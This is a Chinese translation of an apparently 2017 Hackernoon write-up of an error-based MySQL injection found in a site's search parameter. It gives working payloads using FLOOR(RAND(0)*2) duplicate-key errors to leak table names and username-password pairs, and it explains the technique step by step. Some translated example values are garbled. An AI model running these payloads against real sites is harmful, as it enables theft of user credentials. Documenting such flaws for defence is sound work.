<html>
<head>
<title>Exploit database error to leak users table informations ( writeup )</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用数据库错误泄漏用户表信息(书面)</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/exploit-database-error-to-leak-users-table-informations-writeup-be62b3c86968?source=collection_archive---------5-----------------------#2017-02-20">https://medium.com/hackernoon/exploit-database-error-to-leak-users-table-informations-writeup-be62b3c86968?source=collection_archive---------5-----------------------#2017-02-20</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="976f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">大家好</p><p id="e4bd" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我不太在网上发表文章，因为大多数工作都是在NDA的指导下私下完成的，但这次我决定发表这篇文章(在网站所有者同意后匿名)，因为太多的开发人员坚持认为你不能利用复杂的<a class="ae jp" href="https://hackernoon.com/tagged/sql" rel="noopener ugc nofollow" target="_blank">SQL</a>，或非结果SQL(例如:count(*) sql)。</p><p id="8700" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">首先，我接到一个朋友的电话，告诉我一个黑客联系了他们，并告诉他们，他在他们的网站上发现了sql注入，并表示他打算勒索他们。</p><p id="527f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我打开网站，试着用参数来检查，几分钟后我在他们的搜索页面发现了一个错误。<br/>搜索页面make ajax请求当你过滤结果到页面时，term参数是不过滤的那个。</p><p id="abe2" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">/?FilterThemes?tags[]=free&amp;term='</code></p><p id="fbaa" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">它生成一个带有完整sql转储的<a class="ae jp" href="https://hackernoon.com/tagged/database" rel="noopener ugc nofollow" target="_blank">数据库</a>错误页面(调试模式:)。</p><pre class="ju jv jw jx fq jy jt jz ka aw kb dt"><span id="80c3" class="kc kd hu jt b fv ke kf l kg kh">ERROR 1064<br/>You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near '',themes.tag_title) != 0' at line 1</span><span id="807b" class="kc kd hu jt b fv ki kf l kg kh">SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET(''',themes.tag_title) != 0 or `themes`.`title` like '%'%' or `themes`.`desc` like '%'%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12</span></pre><p id="b5f8" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">太棒了，但是等等…</p><p id="e9a1" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">该参数首先传递给计数查询，然后再传递给聚合查询..因此，我们的有效负载必须通过这两个查询，并用union执行它..</p><p id="8c80" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">或者…</p><p id="3d6b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我记得我们用它来开发盲SQL注入的不寻常的方法，这种方法不会对浏览器产生任何结果——这种方法只有在显示错误时才能实现，这比我们在这里所做的还要好，对吧！</p><p id="c12a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><strong class="it hv">概念验证</strong></p><p id="172b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">让我们更改poc的有效负载</p><p id="afeb" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">/?FilterThemes?tags[]=free&amp;term=d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='</code></p><p id="fd4d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">答对了:)</p><pre class="ju jv jw jx fq jy jt jz ka aw kb dt"><span id="28ff" class="kc kd hu jt b fv ke kf l kg kh">ERROR 1062 <br/>Duplicate entry 'hello1world' for key 'group_key'</span><span id="195d" class="kc kd hu jt b fv ki kf l kg kh">SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET('<!-- -->d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='<!-- -->',themes.tag_title) != 0 or `themes`.`title` like '%<!-- -->d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='<!-- -->%' or `themes`.`desc` like '%<!-- -->d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT('hello',FLOOR(RAND(0)*2),'world')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='<!-- -->%' AND match (themes.tag_title) against ('free' in boolean mode) order by `themes`.`id` desc limit 12</span></pre><p id="582c" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">注意到了吗:)，表情<code class="eh jq jr js jt b">CONCAT('hello',FLOOR(RAND(0)*2),'world')</code>已经求值显示了:)</p><p id="7df5" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在我们结束之前，让我解释一下sql查询及其工作原理。</p><p id="c4d0" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">有一些关于MySQL的信息你需要知道。</p><ol class=""><li id="8cc9" class="kj kk hu it b iu iv iy iz jc kl jg km jk kn jo ko kp kq kr dt translated">当mysql试图运行包含多个子查询的sql时，它首先评估子查询，然后评估父查询</li><li id="f38f" class="kj kk hu it b iu ks iy kt jc ku jg kv jk kw jo ko kp kq kr dt translated">使用group by时需要一个<strong class="it hv">唯一键</strong>。</li></ol><p id="d18e" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">为了了解更多，让我们在我们的终端上尝试一些查询。</p><p id="45f1" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">Select count(*) from INFORMATION_SCHEMA.CHARACTER_SETS;</code></p><p id="587a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">Normal count sql计算信息方案数据库(mysql中的默认数据库)中的记录数。现在让我们稍微玩一下这个sql。</p><p id="88fe" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">select count(*), version() x from INFORMATION_SCHEMA.CHARACTER_SETS group by x</code></p><p id="ebcf" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">同样没什么特别的，我们添加了version()(函数检索mysql版本)并将其命名为x，然后我们按它分组。</p><pre class="ju jv jw jx fq jy jt jz ka aw kb dt"><span id="6975" class="kc kd hu jt b fv ke kf l kg kh">+----------+----------------------------------------+<br/>| count(*) | x                                      |<br/>+----------+----------------------------------------+<br/>|       40 | 10.2.3-MariaDB-10.2.3+maria~xenial-log |<br/>+----------+----------------------------------------+</span></pre><ul class=""><li id="c54e" class="kj kk hu it b iu iv iy iz jc kl jg km jk kn jo kx kp kq kr dt translated"><em class="ky">我在我的本地机器上使用maria db，它是mysql的一个分支，但是经过了很多优化</em></li></ul><p id="277b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">好吧，让我们积极一点</p><p id="1b82" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">SELECT count(*), CONCAT(version(),floor(rand(0) *2)) x from INFORMATION_SCHEMA.CHARACTER_SETS group by x;</code></p><p id="8710" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们添加了一个小变化<code class="eh jq jr js jt b"> ( floor(rand(0) * 2) ) </code>,如果您运行这个sql，您将得到</p><p id="fd20" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">ERROR 1062 (23000): Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key'</code></p><p id="bcb0" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">你还记得我之前告诉你的关于Mysql要求组密钥唯一的信息吗:)。</p><p id="04cb" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b"> ( floor(rand(0) * 2) )</code>产生一个序列<strong class="it hv"> 0，1，1，0，1，1</strong>T16<code class="eh jq jr js jt b">version()</code>将总是相同的。</p><p id="21fa" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">因此count(*)的第一次迭代将是</p><p id="425b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">CONCAT(version(),floor(rand(0) *2))</code><br/>=<br/>T6】</p><p id="d06f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">然后</p><p id="6863" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">CONCAT(version(),floor(rand(0) *2))</code><br/>=<br/>T8】</p><p id="4140" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">然后</p><p id="95cc" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">CONCAT(version(),floor(rand(0) *2))</code> <br/> = <br/> <code class="eh jq jr js jt b">10.2.3-MariaDB-10.2.3+maria~xenial-log<strong class="it hv">1</strong></code> = &gt;这里就重复了；)然后我们得到了错误</p><p id="1760" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">Duplicate entry '10.2.3-MariaDB-10.2.3+maria~xenial-log1' for key 'group_key'</code></p><p id="b7be" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">懂了吗:)</p><p id="0b17" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">让我们回到我们的剥削。</p><p id="2c53" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们发现了错误，我们发现了漏洞..现在我们需要一些有价值的信息。</p><p id="501a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">从INFORMATION_SCHEME.tables开始，我们可以获取表名。</p><p id="3f24" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">使用简单的脚本，我们可以通过从db错误中提取结果来获取所有的表名，只需向脚本提供有效负载。</p><p id="d1b5" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select TABLE_NAME from INFORMATION_SCHEMA.TABLES LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='%</code></p><p id="cfa6" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">现在我们知道了用户表。使用新的有效负载修改脚本以获取用户数据。</p><p id="7d0a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><code class="eh jq jr js jt b">%d%' AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select concat(username,'-',password) from users LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '%'='%</code></p><p id="8275" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">就是这样。</p><p id="9842" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">吸取的教训</p><ol class=""><li id="42b0" class="kj kk hu it b iu iv iy iz jc kl jg km jk kn jo ko kp kq kr dt translated">在生产中始终关闭错误。</li><li id="a05f" class="kj kk hu it b iu ks iy kt jc ku jg kv jk kw jo ko kp kq kr dt translated">不要低估任何漏洞，99%的漏洞都可以被利用。</li></ol><p id="863e" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">注意安全。</p><blockquote class="kz la lb"><p id="289e" class="ir is ky it b iu iv iw ix iy iz ja jb lc jd je jf ld jh ji jj le jl jm jn jo hn dt translated"><a class="ae jp" href="http://bit.ly/Hackernoon" rel="noopener ugc nofollow" target="_blank">黑客中午</a>是黑客如何开始他们的下午。我们是<a class="ae jp" href="http://bit.ly/atAMIatAMI" rel="noopener ugc nofollow" target="_blank"> @AMI </a>家庭的一员。我们现在<a class="ae jp" href="http://bit.ly/hackernoonsubmission" rel="noopener ugc nofollow" target="_blank">接受投稿</a>，并乐意<a class="ae jp" href="mailto:partners@amipublications.com" rel="noopener ugc nofollow" target="_blank">讨论广告&amp;赞助</a>机会。</p><p id="dca4" class="ir is ky it b iu iv iw ix iy iz ja jb lc jd je jf ld jh ji jj le jl jm jn jo hn dt translated">要了解更多信息，请<a class="ae jp" href="https://goo.gl/4ofytp" rel="noopener ugc nofollow" target="_blank">阅读我们的“关于”页面</a>、<a class="ae jp" href="http://bit.ly/HackernoonFB" rel="noopener ugc nofollow" target="_blank">在脸书上点赞/给我们发消息</a>，或者简单地说，<a class="ae jp" href="https://goo.gl/k7XYbx" rel="noopener ugc nofollow" target="_blank"> tweet/DM @HackerNoon。</a></p><p id="708a" class="ir is ky it b iu iv iw ix iy iz ja jb lc jd je jf ld jh ji jj le jl jm jn jo hn dt translated">如果你喜欢这个故事，我们推荐你阅读我们的<a class="ae jp" href="http://bit.ly/hackernoonlatestt" rel="noopener ugc nofollow" target="_blank">最新科技故事</a>和<a class="ae jp" href="https://hackernoon.com/trending" rel="noopener ugc nofollow" target="_blank">趋势科技故事</a>。直到下一次，不要把世界的现实想当然！</p></blockquote><figure class="ju jv jw jx fq lf"><div class="bz el l di"><div class="lg lh l"/></div></figure></div></div>    
</body>
</html>